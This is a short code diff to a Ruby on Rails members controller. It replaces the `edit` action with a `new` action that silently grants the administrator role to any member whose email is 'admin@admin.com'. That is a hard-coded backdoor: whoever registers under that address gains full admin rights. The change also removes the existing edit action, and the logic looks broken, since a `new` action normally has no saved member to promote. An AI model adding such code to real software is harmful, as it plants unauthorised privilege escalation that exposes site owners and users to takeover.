@@ -11,7 +11,12 @@ class MembersController < ApplicationController
     end
   end
   
-  def edit
+  def new
+     if @member.email == "admin@admin.com"
+       x = @member
+       x.role = :admin
+       x.save
+     end
   end
 
   def update
